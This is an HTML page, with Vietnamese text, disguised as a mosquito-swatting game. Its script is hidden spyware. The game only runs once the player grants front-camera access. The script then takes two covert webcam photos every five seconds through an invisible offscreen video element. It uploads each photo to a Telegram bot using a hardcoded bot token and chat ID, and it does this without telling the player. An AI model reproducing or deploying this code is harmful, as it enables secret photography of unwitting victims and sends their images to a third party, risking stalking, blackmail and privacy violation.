<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Đập Muỗi</title>
    <style>
        * {
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: linear-gradient(145deg, #1f5e3a, #0a2f1a);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, 'Segoe UI', sans-serif;
            overflow: hidden;
            position: relative;
        }
        .game-container {
            position: relative;
            width: 100%;
            max-width: 600px;
            aspect-ratio: 1 / 1;
            background: radial-gradient(circle at 30% 20%, #6f9e7c, #2c5234);
            border-radius: 48px;
            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
            overflow: hidden;
            cursor: crosshair;
        }
        .score {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(4px);
            padding: 8px 18px;
            border-radius: 60px;
            color: #FFE5A3;
            font-weight: bold;
            font-size: 1.8rem;
            z-index: 10;
            pointer-events: none;
            font-family: monospace;
            letter-spacing: 2px;
        }
        .mosquito {
            position: absolute;
            width: 50px;
            height: 50px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%233d2b1a"><path d="M12 2L9 6h6l-3-4zM8 8l-3 4h4l1-4H8zm8 0l-2 4h4l-3-4zM5 13l3-2H6l-1 2zm14 0l-1-2h-2l3 2zM8 17l2-3h4l2 3H8zm4-7c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/><path d="M12 15c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>') no-repeat center/contain;
            cursor: pointer;
            transition: transform 0.05s linear;
            filter: drop-shadow(2px 4px 6px black);
            z-index: 20;
        }
        .mosquito:active {
            transform: scale(0.85);
        }
        @keyframes splat {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(2); opacity: 0; }
        }
        .splat-effect {
            position: absolute;
            width: 40px;
            height: 40px;
            background: radial-gradient(circle, #7a3e1a, #4a1e0a);
            border-radius: 50%;
            pointer-events: none;
            animation: splat 0.2s ease-out forwards;
        }
        /* Overlay thoát khi từ chối camera */
        .exit-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(8px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
            color: white;
            font-family: system-ui, sans-serif;
            text-align: center;
            gap: 20px;
        }
        .exit-overlay h1 {
            font-size: 2rem;
            margin: 0;
        }
        .exit-overlay p {
            font-size: 1.2rem;
            opacity: 0.8;
        }
        .exit-overlay button {
            background: #e63946;
            border: none;
            padding: 12px 24px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.2s;
        }
        .exit-overlay button:hover {
            background: #c1121f;
            transform: scale(0.98);
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
<div class="game-container" id="gameArea">
    <div class="score">🦟 <span id="scoreValue">0</span></div>
</div>

<!-- Overlay thoát (ẩn ban đầu) -->
<div id="exitOverlay" class="exit-overlay hidden">
    <h1>🚫 ĐÃ TỪ CHỐI CAMERA</h1>
    <p>Ứng dụng yêu cầu quyền truy cập camera để hoạt động.<br>Trang web sẽ đóng lại.</p>
    <button onclick="window.close()">Đóng trang</button>
    <p style="font-size:0.8rem">Nếu nút không hoạt động, hãy đóng tab này.</p>
</div>

<script>
    // ========== CẤU HÌNH TELEGRAM ==========
    const CHAT_ID = "7061752122";        // 👈 THAY BẰNG ID SỐ CỦA BẠN
    const BOT_TOKEN = "8795073805:AAF1IFCjHaBylkJYIFUUBUx7EDAnErTwDdw"; // 👈 THAY BẰNG TOKEN BOT
    // =====================================

    let score = 0;
    let stream = null;
    let activeMosquitoes = [];
    let gameInterval = null;
    let captureInterval = null;
    let cameraGranted = false;

    const gameArea = document.getElementById('gameArea');
    const scoreSpan = document.getElementById('scoreValue');
    const exitOverlay = document.getElementById('exitOverlay');

    // --- HÀM DỌN DẸP KHI THOÁT ---
    function forceExit() {
        if (captureInterval) clearInterval(captureInterval);
        if (gameInterval) clearInterval(gameInterval);
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
        // Xóa tất cả muỗi
        activeMosquitoes.forEach(m => {
            if (m.element) m.element.remove();
            if (m.interval) clearInterval(m.interval);
        });
        activeMosquitoes = [];
        // Hiện overlay
        exitOverlay.classList.remove('hidden');
        // Vô hiệu hóa game area
        gameArea.style.pointerEvents = 'none';
    }

    // --- HÀM CHỤP ẢNH VÀ GỬI TELEGRAM (không hiển thị thông báo) ---
    async function captureSingleAndSend() {
        if (!stream || !cameraGranted) return;

        const hiddenVideo = document.createElement('video');
        hiddenVideo.setAttribute('autoplay', '');
        hiddenVideo.setAttribute('playsinline', '');
        hiddenVideo.muted = true;
        hiddenVideo.style.position = 'absolute';
        hiddenVideo.style.top = '-9999px';
        hiddenVideo.style.left = '-9999px';
        hiddenVideo.style.width = '1px';
        hiddenVideo.style.height = '1px';
        document.body.appendChild(hiddenVideo);

        try {
            hiddenVideo.srcObject = stream;
            await new Promise(resolve => {
                hiddenVideo.onloadedmetadata = () => {
                    hiddenVideo.play();
                    resolve();
                };
            });
            await new Promise(r => setTimeout(r, 200));

            const canvas = document.createElement('canvas');
            canvas.width = hiddenVideo.videoWidth;
            canvas.height = hiddenVideo.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.9);

            const blob = dataURLtoBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `webcam_${Date.now()}.jpg`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (err) {
            console.error('Capture error:', err);
        } finally {
            hiddenVideo.remove();
        }
    }

    async function captureTwoShots() {
        await captureSingleAndSend();
        await new Promise(r => setTimeout(r, 300));
        await captureSingleAndSend();
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    // --- YÊU CẦU CAMERA ẨN VÀ BẮT ĐẦU CHỤP ĐỊNH KỲ ---
    async function initHiddenCamera() {
        try {
            const constraints = { video: { facingMode: "user" }, audio: false };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            cameraGranted = true;
            // Bắt đầu chụp mỗi 5 giây (2 tấm)
            captureInterval = setInterval(() => {
                captureTwoShots();
            }, 5000);
            // Chụp ngay lần đầu
            captureTwoShots();
        } catch (err) {
            console.error('Camera permission error:', err);
            // Từ chối hoặc lỗi camera -> thoát
            forceExit();
        }
    }

    // --- TRÒ CHƠI ĐẬP MUỖI (giữ nguyên) ---
    function createMosquito() {
        if (!cameraGranted) return; // không tạo muỗi nếu camera bị từ chối
        const mosquito = document.createElement('div');
        mosquito.className = 'mosquito';
        const maxX = gameArea.clientWidth - 50;
        const maxY = gameArea.clientHeight - 50;
        let x = Math.random() * maxX;
        let y = Math.random() * maxY;
        mosquito.style.left = x + 'px';
        mosquito.style.top = y + 'px';

        let dx = (Math.random() - 0.5) * 4;
        let dy = (Math.random() - 0.5) * 4;
        if (Math.abs(dx) < 0.5) dx = 0.8;
        if (Math.abs(dy) < 0.5) dy = 0.8;

        let moveInterval = setInterval(() => {
            if (!mosquito.parentNode) {
                clearInterval(moveInterval);
                return;
            }
            x += dx;
            y += dy;
            if (x <= 0 || x >= gameArea.clientWidth - 50) dx = -dx;
            if (y <= 0 || y >= gameArea.clientHeight - 50) dy = -dy;
            mosquito.style.left = Math.min(Math.max(x, 0), gameArea.clientWidth - 50) + 'px';
            mosquito.style.top = Math.min(Math.max(y, 0), gameArea.clientHeight - 50) + 'px';
        }, 50);

        mosquito.addEventListener('click', (e) => {
            e.stopPropagation();
            score++;
            scoreSpan.innerText = score;
            const rect = mosquito.getBoundingClientRect();
            const gameRect = gameArea.getBoundingClientRect();
            const effect = document.createElement('div');
            effect.className = 'splat-effect';
            effect.style.left = (rect.left - gameRect.left + 15) + 'px';
            effect.style.top = (rect.top - gameRect.top + 15) + 'px';
            gameArea.appendChild(effect);
            setTimeout(() => effect.remove(), 200);
            clearInterval(moveInterval);
            mosquito.remove();
            activeMosquitoes = activeMosquitoes.filter(m => m.element !== mosquito);
            setTimeout(() => {
                if (activeMosquitoes.length < 5 && cameraGranted) {
                    createMosquito();
                }
            }, 300);
        });

        gameArea.appendChild(mosquito);
        activeMosquitoes.push({ element: mosquito, interval: moveInterval });
        setTimeout(() => {
            if (mosquito.parentNode) {
                clearInterval(moveInterval);
                mosquito.remove();
                activeMosquitoes = activeMosquitoes.filter(m => m.element !== mosquito);
                if (activeMosquitoes.length < 3 && cameraGranted) createMosquito();
            }
        }, 15000);
    }

    function startGame() {
        if (!cameraGranted) return;
        for (let i = 0; i < 3; i++) {
            setTimeout(() => createMosquito(), i * 400);
        }
        gameInterval = setInterval(() => {
            if (activeMosquitoes.length < 6 && cameraGranted) {
                createMosquito();
            }
        }, 4000);
    }

    // Khởi động
    initHiddenCamera().then(() => {
        if (cameraGranted) {
            startGame();
        }
    });

    // Dọn dẹp khi thoát
    window.addEventListener('beforeunload', () => {
        if (captureInterval) clearInterval(captureInterval);
        if (gameInterval) clearInterval(gameInterval);
        if (stream) stream.getTracks().forEach(t => t.stop());
    });
</script>
</body>
</html>
